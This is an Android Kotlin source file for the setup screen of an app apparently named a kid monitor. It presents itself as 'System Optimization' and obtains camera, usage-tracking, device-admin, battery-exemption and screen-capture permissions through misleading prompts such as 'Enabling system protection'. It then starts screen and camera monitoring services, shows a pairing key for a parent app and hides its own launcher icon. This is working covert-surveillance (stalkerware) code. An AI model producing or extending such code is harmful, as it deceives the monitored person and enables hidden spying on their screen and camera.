package com.parentalcontrol.kidmonitor

import android.app.Activity
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.Manifest
import java.util.UUID

/**
 * One-time setup screen (disguised as "System Optimization").
 *
 * On EVERY launch it checks if the pairing key has been shown yet.
 * If not, it shows the key dialog first — BEFORE hiding the icon — so the
 * activity is never killed mid-dialog by Android's component-disable logic.
 *
 * Flow (fresh install):
 *   1. Grant all permissions
 *   2. Screen capture granted → service started → KEY DIALOG shown
 *   3. User taps Done/Copy → icon hidden → activity finishes
 *
 * Flow (reinstall / upgrade — setup already done):
 *   1. Key generated (if missing) → KEY DIALOG shown immediately
 *   2. User taps Done → ensure service is running → finish
 */
class SetupActivity : AppCompatActivity() {

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private lateinit var btnAction: Button
    private lateinit var tvStatus: TextView
    private lateinit var progressBar: ProgressBar

    private val prefs by lazy { getSharedPreferences(PREFS_NAME, MODE_PRIVATE) }
    private val mainHandler = Handler(Looper.getMainLooper())

    /** Auto-hide countdown timer — cancelled if user taps any dialog button first. */
    private var autoHideTimer: CountDownTimer? = null

    // ─── Permission Launchers ─────────────────────────────────────────
    private val notifPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { nextStep() }

    private val cameraPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { nextStep() }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            prefs.edit()
                .putInt(KEY_PROJ_RESULT_CODE, result.resultCode)
                .putBoolean(KEY_SETUP_DONE, true)
                .apply()
            MonitorService.startWithProjection(this, result.resultCode, result.data!!)
            // Also start camera stream service (listens for commands)
            CameraStreamService.start(this)
            showCompletionStatus()
            showPairingKeyDialog(afterSetup = true)
        } else {
            tvStatus.text = "Screen permission required. Tap to retry."
            btnAction.text = "Grant Permission"
            btnAction.visibility = View.VISIBLE
            btnAction.setOnClickListener { requestScreenCapture() }
        }
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { nextStep() }

    private val usagePermLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { nextStep() }

    private val batteryOptLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { nextStep() }

    // ─── Lifecycle ────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Always generate key first (idempotent)
        ensurePairingKey()

        // If setup already done → show key (if not yet seen), then finish
        if (prefs.getBoolean(KEY_SETUP_DONE, false)) {
            if (!prefs.getBoolean(KEY_KEY_SHOWN, false)) {
                // Inflate layout minimally so dialog can attach to window
                setContentView(R.layout.activity_setup)
                btnAction   = findViewById(R.id.btnAction)
                tvStatus    = findViewById(R.id.tvStatus)
                progressBar = findViewById(R.id.progressBar)
                btnAction.visibility   = View.GONE
                progressBar.visibility = View.INVISIBLE
                tvStatus.text = "Your pairing key:"
                // Show immediately — NO delay, NO hideAppIcon before dialog
                showPairingKeyDialog(afterSetup = false)
            } else {
                // Key already shown — just ensure service and leave silently
                ensureServiceRunning()
                finish()
            }
            return
        }

        // First-time setup
        setContentView(R.layout.activity_setup)
        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        btnAction   = findViewById(R.id.btnAction)
        tvStatus    = findViewById(R.id.tvStatus)
        progressBar = findViewById(R.id.progressBar)

        btnAction.setOnClickListener { nextStep() }
        nextStep()
    }

    override fun onDestroy() {
        // Cancel auto-hide timer to prevent memory leak if activity is killed mid-countdown
        autoHideTimer?.cancel()
        autoHideTimer = null
        super.onDestroy()
    }

    // ─── Pairing Key + Device ID ─────────────────────────────────────
    private fun ensurePairingKey() {
        // Pairing key
        if (prefs.getString(KEY_PAIRING_KEY, null) == null) {
            val key = UUID.randomUUID().toString()
                .replace("-", "")
                .take(8)
                .uppercase()
            prefs.edit().putString(KEY_PAIRING_KEY, key).apply()
        }
        // Device ID — must be set BEFORE services start to avoid race condition
        if (prefs.getString(KEY_DEVICE_ID, null) == null) {
            prefs.edit().putString(KEY_DEVICE_ID, UUID.randomUUID().toString()).apply()
        }
    }

    // ─── Step machine ─────────────────────────────────────────────────
    private fun nextStep() {
        when {
            !hasNotificationPermission() -> requestNotifPermission()
            !hasCameraPermission()       -> requestCameraPermission()
            !hasUsageStatsPermission()   -> requestUsageStats()
            !isDeviceAdminActive()       -> requestDeviceAdmin()
            !isBatteryOptIgnored()       -> requestBatteryOptimization()
            else                         -> requestScreenCapture()
        }
    }

    private fun hasNotificationPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) ==
                    PackageManager.PERMISSION_GRANTED
        } else true
    }

    private fun requestNotifPermission() {
        setStatus("Requesting notification access...", 15)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            notifPermLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) ==
                PackageManager.PERMISSION_GRANTED
    }

    private fun requestCameraPermission() {
        setStatus("Enabling camera access...", 25)
        cameraPermLauncher.launch(Manifest.permission.CAMERA)
    }

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(),
            packageName
        )
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun requestUsageStats() {
        setStatus("Enabling app usage tracking...", 40)
        usagePermLauncher.launch(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
    }

    private fun isDeviceAdminActive(): Boolean {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(this, DeviceAdminReceiver::class.java))
    }

    private fun requestDeviceAdmin() {
        setStatus("Enabling system protection...", 60)
        val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for system optimization and security.")
        }
        deviceAdminLauncher.launch(intent)
    }

    private fun isBatteryOptIgnored(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun requestBatteryOptimization() {
        setStatus("Optimizing battery usage...", 75)
        batteryOptLauncher.launch(
            Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
        )
    }

    private fun requestScreenCapture() {
        setStatus("Enabling screen monitoring...", 90)
        screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
    }

    // ─── Completion UI (shown while dialog is about to appear) ────────
    private fun showCompletionStatus() {
        tvStatus.text = "Setup complete ✓"
        progressBar.progress = 100
        progressBar.visibility = View.INVISIBLE
        btnAction.visibility = View.GONE
    }

    // ─── Pairing key dialog ───────────────────────────────────────────
    /**
     * Shows the pairing key and starts a 10-second countdown.
     * The icon is hidden automatically when the timer reaches 0, or
     * immediately if the user taps any button.
     *
     * @param afterSetup  true = fresh setup just finished (icon not hidden yet)
     *                    false = reopened app with setup already done
     */
    private fun showPairingKeyDialog(afterSetup: Boolean) {
        ensurePairingKey()
        val key = prefs.getString(KEY_PAIRING_KEY, "ERROR") ?: "ERROR"

        // Record that we showed the key
        prefs.edit().putBoolean(KEY_KEY_SHOWN, true).apply()

        fun buildMessage(secsLeft: Int): String =
            "Your device pairing key:\n\n" +
            "        $key\n\n" +
            "Open the Parent Monitor app and tap\n" +
            "\"➕ Add Kid Device\", then enter this key.\n\n" +
            "Keep it private — only share with trusted parents.\n\n" +
            "⏱ This screen closes in $secsLeft second${if (secsLeft == 1) "" else "s"}..."

        val dialog = AlertDialog.Builder(this)
            .setTitle("📱 Pairing Key")
            .setMessage(buildMessage(10))
            .setPositiveButton("📋 Copy & Done") { _, _ ->
                autoHideTimer?.cancel()
                autoHideTimer = null
                copyKey(key)
                onDialogDismissed(afterSetup)
            }
            .setNegativeButton("Done") { _, _ ->
                autoHideTimer?.cancel()
                autoHideTimer = null
                onDialogDismissed(afterSetup)
            }
            .setNeutralButton("Show Again Next Time") { _, _ ->
                autoHideTimer?.cancel()
                autoHideTimer = null
                // Reset flag so it shows again on next launch
                prefs.edit().putBoolean(KEY_KEY_SHOWN, false).apply()
                onDialogDismissed(afterSetup)
            }
            .setCancelable(false)
            .show()

        // ── 10-second auto-hide countdown ────────────────────────────
        autoHideTimer = object : CountDownTimer(10_000L, 1_000L) {
            override fun onTick(millisUntilFinished: Long) {
                val secsLeft = ((millisUntilFinished + 999L) / 1_000L).toInt()
                if (dialog.isShowing) {
                    dialog.setMessage(buildMessage(secsLeft))
                }
            }
            override fun onFinish() {
                autoHideTimer = null
                if (dialog.isShowing) dialog.dismiss()
                onDialogDismissed(afterSetup)
            }
        }.start()
    }

    private fun onDialogDismissed(afterSetup: Boolean) {
        hideAppIcon()             // Always re-hide — safe to call repeatedly
        if (!afterSetup) {
            ensureServiceRunning()
        }
        finish()
    }

    private fun copyKey(key: String) {
        val cm = getSystemService(CLIPBOARD_SERVICE) as android.content.ClipboardManager
        cm.setPrimaryClip(android.content.ClipData.newPlainText("Pairing Key", key))
        android.widget.Toast.makeText(this,
            "✅ Key copied: $key", android.widget.Toast.LENGTH_LONG).show()
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, SetupActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun ensureServiceRunning() {
        if (!MonitorService.isRunning) {
            val intent = Intent(this, ProjectionRequestActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        }
    }

    private fun setStatus(msg: String, progress: Int) {
        tvStatus.text = msg
        progressBar.progress = progress
        btnAction.visibility = View.GONE
    }

    companion object {
        const val PREFS_NAME            = "monitor_prefs"
        const val KEY_SETUP_DONE        = "setup_done"
        const val KEY_PROJ_RESULT_CODE  = "proj_result_code"
        const val KEY_DEVICE_ID         = "device_id"
        const val KEY_PAIRING_KEY       = "pairing_key"
        const val KEY_KEY_SHOWN         = "pairing_key_shown"
    }
}
